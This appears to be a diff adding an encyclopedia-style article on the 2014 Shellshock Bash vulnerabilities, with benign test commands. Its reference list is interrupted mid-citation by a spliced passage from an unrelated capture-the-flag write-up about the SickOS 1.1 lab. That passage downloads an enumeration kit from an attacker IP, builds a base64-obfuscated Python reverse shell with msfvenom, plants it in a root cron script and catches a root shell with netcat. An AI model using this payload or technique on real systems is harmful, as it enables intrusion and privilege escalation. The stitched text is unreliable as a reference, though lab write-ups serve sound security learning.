@@ -1,0 +1,381 @@
+This article's lead section may be too long. Please read the length guidelines and help move details into the article's body. (November 2016) (Learn how and when to remove this message)
+Shellshock
+A simple Shellshock logo, similar to the Heartbleed bug logo.
+CVE identifiers	CVE-2014-6271 (initial),
+CVE-2014-6277,
+CVE-2014-6278,
+CVE-2014-7169,
+CVE-2014-7186,
+CVE-2014-7187
+Date discovered	12 September 2014; 11 years ago
+Date patched	24 September 2014; 11 years ago
+Discoverer	Stéphane Chazelas
+Affected software	Bash (1.0.3–4.3)
+
+Shellshock, also known as Bashdoor,[1] is a family of security bugs[2] in the Unix Bash shell, discovered by Stéphane Chazelas and disclosed on 24 September 2014. The vulnerability allows an attacker to cause Bash to execute arbitrary commands, which can lead to unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.[3]
+
+The bug's root cause was in how Bash executed commands concatenated to the end of function definitions stored in environment variables.[1][6] Within days of the initial publication, a variety of related vulnerabilities were also discovered, which were subsequently patched.[7][8] Attackers exploited Shellshock within hours of the disclosure, creating botnets for denial-of-service attacks and vulnerability scanning.[9][10] Due to its wide reach, Shellshock was compared in severity to the Heartbleed bug.[3][13]
+Background
+
+The Shellshock bug affects Bash, a program that various Unix-based systems use to execute command lines and command scripts. It is often installed as the system's default command-line interface. Analysis of the source code history of Bash shows the bug was introduced on 5 August 1989, and released in Bash version 1.03 on 1 September 1989.[14][15][16] The bug caused Bash to unintentionally execute commands when the commands are concatenated to the end of function definitions stored in the values of environment variables.[1][6]
+
+Shellshock is an arbitrary code execution vulnerability that offers a way for users of a system to execute commands that should be unavailable to them. This happens through Bash's "function export" feature, whereby one Bash process can share command scripts with other Bash processes that it executes.[17] This feature is implemented by encoding the scripts in a table that is shared between the processes, known as the environment variable list. Each new Bash process scans this table for encoded scripts, assembles each one into a command that defines that script in the new process, and executes that command.[18] The new process assumes that the scripts found in the list come from another Bash process, but it cannot verify this, nor can it verify that the command that it has built is a properly formed script definition. Therefore, an attacker can execute arbitrary commands on the system or exploit other bugs that may exist in Bash's command interpreter, if the attacker has a way to manipulate the environment variable list and then cause Bash to run. At the time the bug was discovered, Bash was installed on macOS and many Linux operating systems as the main command interpreter, so that any program that used the system function to run any other program would use Bash to do so.
+
+The presence of the bug was announced to the public on 2014-09-24, when Bash updates with the fix were ready for distribution,[5] though it took some time for computers to be updated to close the potential security issue.
+Reports of attacks
+
+Within an hour of the announcement of the Bash vulnerability, there were reports of machines being compromised by the bug. By 25 September 2014, botnets based on computers compromised with exploits based on the bug were being used by attackers for distributed denial-of-service (DDoS) attacks and vulnerability scanning.[9][10][19] Kaspersky Labs reported that machines compromised in an attack, dubbed "Thanks-Rob", were conducting DDoS attacks against three targets, which they did not identify.[9] On 26 September 2014, a Shellshock-related botnet dubbed "wopbot" was reported, which was being used for a DDoS attack against Akamai Technologies and to scan the United States Department of Defense.[10]
+
+On 26 September, the security firm Incapsula noted 17,400 attacks on more than 1,800 web domains, originating from 400 unique IP addresses, in the previous 24 hours; 55% of the attacks were coming from China and the United States.[11] By 30 September, the website performance firm CloudFlare said it was tracking approximately 1.5 million attacks and probes per day related to the bug.[12]
+
+On 6 October, it was widely reported that Yahoo! servers had been compromised in an attack related to the Shellshock issue.[20][21] Yet the next day, it was denied that it had been Shellshock that specifically had allowed these attacks.[22]
+Specific exploitation vectors
+
+CGI-based web server
+    When a web server uses the Common Gateway Interface (CGI) to handle a document request, it copies certain information from the request into the environment variable list and then delegates the request to a handler program. If the handler is a Bash script, or if it executes Bash, then Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted document request.[6]
+    Security documentation for the widely used Apache web server states: "CGI scripts can ... be extremely dangerous if they are not carefully checked,"[23] and other methods of handling web server requests are typically used instead. There are a number of online services which attempt to test the vulnerability against web servers exposed to the Internet.[citation needed]
+OpenSSH server
+    OpenSSH has a "ForceCommand" feature, where a fixed command is executed when the user logs in, instead of just running an unrestricted command shell. The fixed command is executed even if the user specified that another command should be run; in that case the original command is put into the environment variable "SSH_ORIGINAL_COMMAND". When the forced command is run in a Bash shell (if the user's shell is set to Bash), the Bash shell will parse the SSH_ORIGINAL_COMMAND environment variable on start-up, and run the commands embedded in it. The user has used their restricted shell access to gain unrestricted shell access, using the Shellshock bug.[24]
+DHCP clients
+    Some DHCP clients can also pass commands to Bash; a vulnerable system could be attacked when connecting to an open Wi-Fi network. A DHCP client typically requests and gets an IP address from a DHCP server, but it can also be provided a series of additional options. A malicious DHCP server could provide, in one of these options, a string crafted to execute code on a vulnerable workstation or laptop.[13]
+Qmail server
+    When using Bash to process email messages (e.g. through .forward or qmail-alias piping), the qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash.[25][7]
+IBM HMC restricted shell
+    The bug can be exploited to gain access to Bash from the restricted shell of the IBM Hardware Management Console,[26] a tiny Linux variant for system administrators. IBM released a patch to resolve this.[27]
+
+Reported vulnerabilities
+Overview
+
+On 12 September 2014, Stéphane Chazelas informed Bash's maintainer Chet Ramey[1] of his discovery of the original bug, which he called "Bashdoor". Working with security experts, Mr. Chazelas developed a patch[1] (fix) for the issue, which by then had been assigned the vulnerability identifier CVE-2014-6271.[4] The existence of the bug was announced to the public on 2014-09-24, when Bash updates with the fix were ready for distribution.[5] Within days of its publication, a variety of related vulnerabilities were discovered (CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186 and CVE-2014-7187). Ramey addressed these with a series of further patches.[7][8]
+
+The maintainer of Bash was warned about the first discovery of the bug on 2014-09-12; a fix followed soon.[1] A few companies and distributors were informed before the matter was publicly disclosed on 2014-09-24 with CVE identifier CVE-2014-6271.[4][5] However, after the release of the patch there were subsequent reports of different, yet related vulnerabilities.[28]
+
+On 26 September 2014, two open-source contributors, David A. Wheeler and Norihiro Tanaka, noted that there were additional issues, even after patching systems using the most recently available patches. In an email addressed to the oss-sec and bash-bug mailing lists, Wheeler wrote: "This patch just continues the 'whack-a-mole' [sic] job of fixing parsing errors that began with the first patch. Bash's parser is certain [to] have many many many other vulnerabilities".[29]
+
+On 27 September 2014, Michał Zalewski from Google Inc. announced his discovery of other Bash vulnerabilities,[7] one based upon the fact that Bash is typically compiled without address space layout randomization.[30] On 1 October, Zalewski released details of the final bugs and confirmed that a patch by Florian Weimer from Red Hat posted on 25 September does indeed prevent them. He has done that using a fuzzing technique with the aid of software utility known as american fuzzy lop.[31]
+Initial report (CVE-2014-6271)
+
+This original form of the vulnerability (CVE-2014-6271) involves a specially crafted environment variable containing an exported function definition, followed by arbitrary commands. Bash incorrectly executes the trailing commands when it imports the function.[32] The vulnerability can be tested with the following command:
+
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+In systems affected by the vulnerability, the above commands will display the word "vulnerable" as a result of Bash executing the command "echo vulnerable", which was embedded into the specially crafted environment variable named "x".[8][33]
+CVE-2014-6277
+
+Discovered by Michał Zalewski,[7][30][34] the vulnerability CVE-2014-6277, which relates to the parsing of function definitions in environment variables by Bash, can cause a segfault.[35]
+CVE-2014-6278
+
+Also discovered by Michał Zalewski,[35][36] this bug (CVE-2014-6278) relates to the parsing of function definitions in environment variables by Bash.
+CVE-2014-7169
+
+On the same day the original vulnerability was published, Tavis Ormandy discovered this related bug (CVE-2014-7169),[24] which is demonstrated in the following code:
+
+env X='() { (a)=>\' bash -c "echo date"; cat echo
+
+On a vulnerable system, this would execute the command "date" unintentionally.[24]
+
+Here is an example of a system that has a patch for CVE-2014-6271 but not CVE-2014-7169:
+
+$ X='() { (a)=>\' bash -c "echo date"
+bash: X: line 1: syntax error near unexpected token `='
+bash: X: line 1: `' 
+bash: error importing function definition for `X'
+$ cat echo
+Fri Sep 26 01:37:16 UTC 2014
+
+The system displays syntax errors, notifying the user that CVE-2014-6271 has been prevented, but still writes a file named 'echo', into the working directory, containing the result of the 'date' call.
+
+A system patched for both CVE-2014-6271 and CVE-2014-7169 will simply echo the word "date" and the file "echo" will not be created, as shown below:
+
+$ X='() { (a)=>\' bash -c "echo date"
+date
+$ cat echo
+cat: echo: No such file or directory
+
+CVE-2014-7186
+
+Florian Weimer and Todd Sabin found this bug (CVE-2014-7186),[8][31] which relates to an out-of-bounds memory access error in the Bash parser code.[37]
+
+An example of the vulnerability, which leverages the use of multiple "<<EOF" declarations (nested "here documents"):
+
+bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' ||
+echo "CVE-2014-7186 vulnerable, redir_stack"
+
+A vulnerable system will echo the text "CVE-2014-7186 vulnerable, redir_stack".
+CVE-2014-7187
+
+Also found by Florian Weimer,[8] CVE-2014-7187 is an off-by-one error in the Bash parser code, allowing out-of-bounds memory access.[38]
+
+An example of the vulnerability, which leverages the use of multiple "done" declarations:
+
+(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash ||
+echo "CVE-2014-7187 vulnerable, word_lineno"
+
+A vulnerable system will echo the text "CVE-2014-7187 vulnerable, word_lineno". This test requires a shell that supports brace expansion.[39]
+Patches
+
+Until 24 September 2014, Bash maintainer Chet Ramey provided a patch version bash43-025 of Bash 4.3 addressing CVE-2014-6271,[40] which was already packaged by distribution maintainers. On 24 September, bash43-026 followed, addressing CVE-2014-7169.[41] Then CVE-2014-7186 was discovered. Florian Weimer from Red Hat posted some patch code for this "unofficially" on 25 September,[42] which Ramey incorporated into Bash as bash43-027.[43][44]—These patches provided source code only, helpful only for those who know how to compile ("rebuild") a new Bash binary executable file from the patch file and remaining source code files. The patches added a variable name prefix when functions are exported; this prevented arbitrary variables from triggering the vulnerability and enabled other programs to remove Bash functions from the environment.
+
+The next day, Red Hat officially presented appear updates for Red Hat Enterprise Linux,[45][46] after another day for Fedora 21.[47] Canonical Ltd. presented updates for its Ubuntu Long Term Support versions on Saturday, 27 September;[48] on Sunday, there were updates for SUSE Linux Enterprise.[49] The following Monday and Tuesday at the end of the month, Mac OS X updates appeared.[50][51]
+
+On 1 October 2014, Michał Zalewski from Google Inc. finally stated that Weimer's code and bash43-027 had fixed not only the first three bugs but even the remaining three that were published after bash43-027, including his own two discoveries.[31] This means that after the earlier distribution updates, no other updates have been required to cover all the six issues.[46]
+
+All of them have also been covered for the IBM Hardware Management Console.[27]
+References
+
+Perlroth, Nicole (25 September 2014). "Security Experts Expect 'Shellshock' Software Bug in Bash to Be Significant". New York Times. Retrieved 25 September 2014.
+Although described in some sources as a "virus," Shellshock is instead a design flaw in a program that comes with some operating systems. See => Staff (25 September 2014). "What does the "Shellshock" bug affect?". The Safe Mac. Archived from the original on 29 September 2014. Retrieved 27 September 2014.
+Seltzer, Larry (29 September 2014). "Shellshock makes Heartbleed look insignificant". ZDNet. Retrieved 29 September 2014.
+Florian Weimer (24 September 2014). "Re: CVE-2014-6271: remote code execution through bash". oss-sec (Mailing list). Retrieved 1 November 2014.
+Florian Weimer (24 September 2014). "Re: CVE-2014-6271: remote code execution through bash". oss-sec (Mailing list). Retrieved 1 November 2014.
+Leyden, John (24 September 2014). "Patch Bash NOW: 'Shell Shock' bug blasts OS X, Linux systems wide open". The Register. Retrieved 25 September 2014.
+Saarinen, Juha (29 September 2014). "Further flaws render Shellshock patch ineffective". iTnews. Retrieved 29 September 2014.
+Vaughan-Nichols, Steven (27 September 2014). "Shellshock: Better 'bash' patches now available". ZDNet. Retrieved 29 September 2014.
+Greenberg, Andy (25 September 2014). "Hackers Are Already Using the Shellshock Bug to Launch Botnet Attacks". Wired. Retrieved 28 September 2014.
+Saarinen, Juha (26 September 2014). "First Shellshock botnet attacks Akamai, US DoD networks". iTnews. Retrieved 26 September 2014.
+Perlroth, Nicole (26 September 2014). "Companies Rush to Fix Shellshock Software Bug as Hackers Launch Thousands of Attacks". New York Times. Retrieved 29 September 2014.
+Strohm, Chris; Robertson, Jordan (30 September 2014). "Shellshock Draws Hacker Attacks, Sparks Race to Patch Bug". Businessweek. Archived from the original on 1 October 2014. Retrieved 1 October 2014.
+Cerrudo, Cesar (30 September 2014). "Why the Shellshock Bug Is Worse than Heartbleed". MIT Technology Review. Retrieved 1 October 2014.
+Fox, Brian (21 March 1990). "Bash 1.05 ChangeLog". Archived from the original on 6 December 2023. Retrieved 14 October 2014.
+Chazelas, Stéphane (10 October 2014). "when was shellshock introduced". Stéphane Chazelas and Chet Ramey confirm the vulnerability introduction date on Bash official communication channel. Archived from the original on 20 December 2016. Retrieved 14 October 2014.
+Chazelas, Stéphane (25 September 2014). "When was the shellshock (CVE-2014-6271/7169) bug introduced, and what is the patch that fully fixes it?".
+"Bash Reference Manual: Shell Functions". Retrieved 2 October 2014.
+"Bash 4.3 source code, file variables.c, lines 315-388". Retrieved 2 October 2014.
+Various (26 September 2014). "Web attacks build on Shellshock bug". BBC. Retrieved 26 September 2014.
+Boren, Zachary (6 October 2014). "Shellshock: Romanian hackers are accessing Yahoo servers, claims security expert". Independent. Retrieved 7 October 2014.
+"Yahoo! Shellshocked Like Ninja Turtles!". Archived from the original on 9 October 2014. Retrieved 7 October 2014.
+Hanno Böck (7 October 2014). "Yahoo durch Shellshock angegriffen". Golem - IT-News für Profis (in German). Retrieved 30 October 2014.
+"Apache HTTP Server 2.2 Documentation: Security Tips". Retrieved 2 October 2014.
+Kyle George (27 September 2014). "qmail is a vector for CVE-2014-6271 (bash shellshock)". qmail (Mailing list).
+"IBM HMC is a vector for CVE-2014-6271 (bash "shellshock")". IBM. Archived from a copy of the LSE from my PC that was originally obtained from here.
+
+LSE allowed me to scan the host for common privilege escalation points and some additional known vulnerabilities. However, LSE does not include scripts to exploit said vulnerabilities should any be detected. Therefore, I had packaged scripts in with my copy of LSE in a compressed folder for the sake of convenience.
+
+wget http://192.168.57.129/lse.zip
+wget http://192.168.57.129/lse.zip
+--2022-06-30 19:00:04--  http://192.168.57.129/lse.zip
+Connecting to 192.168.57.129:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 22327785 (21M) [application/zip]
+Saving to: `lse.zip'
+
+100%[======================================>] 22,327,785  31.9M/s   in 0.7s    
+
+2022-06-30 19:00:04 (31.9 MB/s) - `lse.zip' saved [22327785/22327785]
+
+After unzipping the folder and executing the script, I received plenty of useful information about the host.
+
+A big thing LSE found was a couple of cron job running as root in directores I had write access in.
+
+=======================================================( recurrent tasks )=====
+[*] ret000 User crontab.................................................... nope
+[!] ret010 Cron tasks writable by user..................................... nope
+[*] ret020 Cron jobs....................................................... yes!
+[*] ret030 Can we read user crontabs....................................... nope
+[*] ret040 Can we list other user cron tasks?.............................. nope
+[*] ret050 Can we write to any paths present in cron jobs.................. yes!
+[!] ret060 Can we write to executable paths present in cron jobs........... yes!
+---
+/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
+/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
+/etc/cron.d/automate:* * * * * root /usr/bin/python /var/www/connect.py
+---
+[i] ret400 Cron files...................................................... skip
+[*] ret500 User systemd timers............................................. nope                                                                                                                                                            
+[!] ret510 Can we write in any system timer?............................... nope
+[i] ret900 Systemd timers.................................................. skip
+
+Particularly, we had write access to the file in this job in particular: /etc/cron.d/automate:* * * * * root /usr/bin/python /var/www/connect.py
+
+Clearly this is a Python script. Whatever it originally does isn't so important as what we might be able to make it do...
+
+... Such as implanting another reverse shell script to automatically run every minute.
+
+To do that, I used msfvenom to craft a reverse_python payload to then write into the Python script.
+
+msfvenom -p cmd/unix/reverse_python LHOST=192.168.57.129 LPORT=4444 -f raw
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 573 bytes
+python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAsICAgICBzdWJwcm9jZXNzICAgICwgICAgIG9zICAgICAgICA7aG9zdD0iMTkyLjE2OC41Ny4xMjkiICAgICAgICA7cG9ydD00NDQ0ICAgICAgICA7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICwgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICAgIDtzLmNvbm5lY3QoKGhvc3QgICAgLCAgICAgcG9ydCkpICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDApICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDEpICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDIpICAgICAgICA7cD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp')[0]))"
+
+www-data@SickOs:/var/www$ echo "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAsICAgICBzdWJwcm9jZXNzICAgICwgICAgIG9zICAgICAgICA7aG9zdD0iMTkyLjE2OC41Ny4xMjkiICAgICAgICA7cG9ydD00NDQ0ICAgICAgICA7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICwgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICAgIDtzLmNvbm5lY3QoKGhvc3QgICAgLCAgICAgcG9ydCkpICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDApICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDEpICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDIpICAgICAgICA7cD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp')[0]))" > connect.py
+
+After opening another NetCat listener and waiting for a few seconds, I got a connection.
+
+sudo nc -lvnp 4444                 
+[sudo] password for meowmycks: 
+listening on [any] 4444 ...
+connect to [192.168.57.129] from (UNKNOWN) [192.168.57.130] 37768
+whoami
+root
+
+I upgraded the shell again (because why not), and finally got the flag.
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@SickOs:~# ^Z
+zsh: suspended  sudo nc -lvnp 4444
+                                                                                                                                                                                                                                            
+┌──(meowmycks㉿catBook)-[~]
+└─$ stty raw -echo;fg 
+[1]  + continued  sudo nc -lvnp 4444
+
+
+root@SickOs:~# export TERM=xterm
+export TERM=xterm
+root@SickOs:~# ls
+ls
+a0216ea4d51874464078c618298b1367.txt
+root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
+cat a0216ea4d51874464078c618298b1367.txt
+If you are viewing this!!
+
+ROOT!
+
+You have Succesfully completed SickOS1.1.
+Thanks for Trying
+
+
+root@SickOs:~# 
+
+Conclusion
+
+By the end of this box, I had learned more about doing research and figuring out how to execute exploits for known vulnerabilities.
+
+With the recent addition of LSE to my arsenal, things became much easier (for better or worse) to do and I felt more able to progress without needlessly getting stuck on minor and unimportant details. original on 19 January 2020.
+"Security Bulletin: Vulnerabilities in Bash affect DS8000 HMC (CVE-2014-6271, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187, CVE-2014-6277, CVE-2014-6278)". IBM. 3 October 2014. Retrieved 2 November 2014.
+"Shellshock". 13 February 2015. Retrieved 17 September 2016.
+Gallagher, Sean (26 September 2014). "Still more vulnerabilities in bash? Shellshock becomes whack-a-mole". Arstechnica. Retrieved 26 September 2014.
+Staff (28 September 2014). "Shellshock, Part 3: Three more security problems in Bash (in german)". Heise Online. Retrieved 28 September 2014.
+"Bash bug: the other two RCEs, or how we chipped away at the original fix (CVE-2014-6277 and '78)". lcamtuf blog. 1 October 2014. Retrieved 8 October 2014.
+"Vulnerability Summary for CVE-2014-6271". NIST. 4 October 2014. Retrieved 8 October 2014.
+"Bash specially-crafted environment variables code injection attack". Red Hat Security. Retrieved 2 October 2014.
+Staff (27 September 2014). "National Cyber Awareness System Vulnerability Summary for CVE-2014-6277". National Institute of Standards and Technology. Retrieved 28 September 2014.
+Constatin, Lucian (29 September 2014). "Improved patch tackles new Shellshock Bash bug attack vectors". PC World. Retrieved 1 October 2014.
+Staff (30 September 2014). "National Cyber Awareness System Vulnerability Summary for CVE-2014-6278". National Institute of Standards and Technology. Retrieved 1 October 2014.
+Staff (29 September 2014). "National Cyber Awareness System Vulnerability Summary for CVE-2014-7186". National Institute of Standards and Technology. Retrieved 1 October 2014.
+Staff (29 September 2014). "National Cyber Awareness System Vulnerability Summary for CVE-2014-7187". National Institute of Standards and Technology. Retrieved 1 October 2014.
+Ramey, Chet. "Re: CVE-2014-7187". lists.gnu.org.
+"BASH PATCH REPORT". GNU.org. 12 September 2014. Retrieved 2 November 2014.
+"BASH PATCH REPORT". GNU.org. 25 September 2014. Retrieved 2 November 2014.
+Weimer, Florian (25 September 2014). "Re: CVE-2014-6271: remote code execution through bash". Openwall Project. Retrieved 2 November 2014.
+"BASH PATCH REPORT". GNU.org. 25 September 2014. Retrieved 2 November 2014.
+Gallagher, Sean (26 September 2014). "New "Shellshock" patch rushed out to resolve gaps in first fix [Updated]". Retrieved 2 November 2014.
+"Important: bash security update". Red Hat. 30 September 2014. Retrieved 2 November 2014.
+"Bash Code Injection Vulnerability via Specially Crafted Environment Variables (CVE-2014-6271, CVE-2014-7169)". Red Hat. 2 October 2014. Retrieved 2 November 2014.
+"[SECURITY] Fedora 21 Update: bash-4.3.25-2.fc21". FedoraProject.org. 27 September 2014. Retrieved 2 November 2014.
+"USN-2364-1: Bash vulnerabilities". Canonical Ltd. 27 September 2014. Retrieved 2 November 2014.
+"SUSE Security Update: Security update for bash". OpenSUSE. 28 September 2014. Retrieved 2 November 2014.
+Clover, Juli (29 September 2014). "Apple Releases OS X Bash Update to Fix 'Shellshock' Security Flaw in Mavericks, Mountain Lion, and Lion". MacRumors.com. Retrieved 2 October 2014.
+Slivka, Eric (30 September 2014). "Apple Releases OS X Yosemite Golden Master Candidate to Developers [Update: Also Public Beta]". MacRumors.com. Retrieved 2 October 2014.
+
+External links
+Wikimedia Commons has media related to Shellshock (software bug).
+
+    iconInternet portal
+
+    NIST National Vulnerability Database Archived 25 September 2011 at the Wayback Machine & CVE Common Vulnerabilities and Exposures
+        CVE-2014-6271 - 20140924nist & 20140909cve (first bug)
+        CVE-2014-6277 - 20140927nist & 20140909cve
+        CVE-2014-6278 - 20140930nist & 20140909cve
+        CVE-2014-7169 - 20140924nist & 20140924cve (second bug)
+        CVE-2014-7186 - 20140929nist & 20140925cve
+        CVE-2014-7187 - 20140929nist & 20140925cve
+    Bash source code from the GNU Project, includes patches for known vulnerabilities (28 September 2014)
+    "Shellshock in the Wild", Malware droppers, Reverse shells & backdoors, Data exfiltration, and DDoS at FireEye, Inc.
+    Collection of attacks seen in the wild (29 September 2014) at SANS Institute
+    Security Alert for CVE-2014-7169 at Oracle
+    "VMware remediation of Bash Code Injection Vulnerability via Specially Crafted Environment Variables" at VMware
+    Cyberwatch Vulnerabilities Database Archived 22 August 2018 at the Wayback Machine
+        CVE-2014-6271
+        CVE-2014-6277
+        CVE-2014-6278
+        CVE-2014-7169
+        CVE-2014-7186
+        CVE-2014-7187
+    ShellShock Exploitation with Metasploit Framework
+
+    vte
+
+Hacking in the 2010s
+← 2000s
+Timeline
+2020s →
+Major incidents	
+2010	
+	Operation Aurora (publication of 2009 events) Australian cyberattacks Operation Olympic Games Operation ShadowNet Operation Payback
+
+2011	
+	Canadian government DigiNotar DNSChanger HBGary Federal Operation AntiSec PlayStation network outage RSA SecurID compromise
+
+2012	
+	LinkedIn hack Stratfor email leak Operation High Roller
+
+2013	
+	South Korea cyberattack Snapchat hack Cyberterrorism attack of June 25 2013 Yahoo! data breach Singapore cyberattacks
+
+2014	
+	Anthem medical data breach Operation Tovar 2014 celebrity nude photo leak 2014 JPMorgan Chase data breach 2014 Sony Pictures hack Russian hacker password theft 2014 Yahoo! data breach
+
+2015	
+	Office of Personnel Management data breach HackingTeam Ashley Madison data breach TalkTalk data breach VTech data breach Ukrainian Power Grid Cyberattack SWIFT banking hack
+
+2016	
+	Bangladesh Bank robbery Hollywood Presbyterian Medical Center ransomware incident Commission on Elections data breach Democratic National Committee cyber attacks Vietnam Airport Hacks DCCC cyber attacks Indian Bank data breaches Surkov leaks Dyn cyberattack Russian interference in the 2016 U.S. elections 2016 Bitfinex hack
+
+2017	
+	SHAttered 2017 Macron e-mail leaks WannaCry ransomware attack Westminster data breach Petya and NotPetya
+		2017 Ukraine ransomware attacks Equifax data breach Deloitte breach Disqus breach
+
+2018	
+	Trustico Atlanta cyberattack British Airways data breach SingHealth data breach
+
+2019	
+	Sri Lanka cyberattack Baltimore ransomware attack Bulgarian revenue agency hack WhatsApp snooping scandal Jeff Bezos phone hacking incident
+
+Hacktivism	
+	Anonymous
+		associated events CyberBerkut GNAA Goatse Security Lizard Squad LulzRaft LulzSec New World Hackers NullCrew OurMine PayPal 14 RedHack Teamp0ison TDO UGNazi Ukrainian Cyber Alliance
+
+Groups	
+	Appin Bangladesh Black Hat Hackers Bureau 121 Charming Kitten Cozy Bear Dark Basin DarkMatter Elfin Team Equation Group Fancy Bear GOSSIPGIRL (confederation) Guccifer 2.0 Hacking Team Helix Kitten Iranian Cyber Army Islamic State Hacking Division Lazarus Group
+		BlueNorOff AndAriel Lords of Dharmaraja NSO Group Numbered Panda PLA Unit 61398 PLA Unit 61486 PLATINUM Pranknet Red Apollo Rocket Kitten Stealth Falcon Syrian Electronic Army Tailored Access Operations The Shadow Brokers xDedic Yemen Cyber Army
+
+Individuals	
+	Ryan Ackroyd Mustafa Al-Bassam Kim Anh Vo George Hotz Guccifer Elliott Gunton Jeremy Hammond Sam Hocevar Junaid Hussain MLT Sabu Track2 Topiary The Jester
+
+Major vulnerabilities
+publicly disclosed	
+	Evercookie (2010) iSeeYou (2013) Heartbleed (2014) Shellshock (2014) POODLE (2014) Rootpipe (2014) Row hammer (2014) SS7 vulnerabilities (2014) WinShock (2014) JASBUG (2015) Stagefright (2015) DROWN (2016) Badlock (2016) Dirty COW (2016) Cloudbleed (2017) Broadcom Wi-Fi (2017) EternalBlue (2017) DoublePulsar (2017) Silent Bob is Silent (2017) KRACK (2017) ROCA vulnerability (2017) BlueBorne (2017) Meltdown (2018) Spectre (2018) EFAIL (2018) Exactis (2018) Speculative Store Bypass (2018) Lazy FP state restore (2018) TLBleed (2018) SigSpoof (2018) Foreshadow (2018) Dragonblood (2019) Microarchitectural Data Sampling (2019) BlueKeep (2019) Kr00k (2019)
+
+Malware	
+2010	
+	Bad Rabbit Black Energy 2 SpyEye Stuxnet
+
+2011	
+	Coreflood Alureon Duqu Kelihos Metulji botnet Stars
+
+2012	
+	Carna Dexter FBI Flame Mahdi Red October Shamoon
+
+2013	
+	CryptoLocker DarkSeoul
+
+2014	
+	Brambul Black Energy 3 Carbanak Careto DarkHotel Duqu 2.0 FinFisher Gameover ZeuS Regin
+
+2015	
+	Dridex Hidden Tear Rombertik TeslaCrypt Project Sauron
+
+2016	
+	Hitler Jigsaw KeRanger Necurs MEMZ Mirai Pegasus Petya and NotPetya Philadelphia X-Agent
+
+2017	
+	BrickerBot Kirk LogicLocker Rensenware Triton WannaCry XafeCopy
+
+2018	
+	Annabelle VPNFilter
+
+2019	
+	Grum Joanap NetTraveler R2D2 Tinba
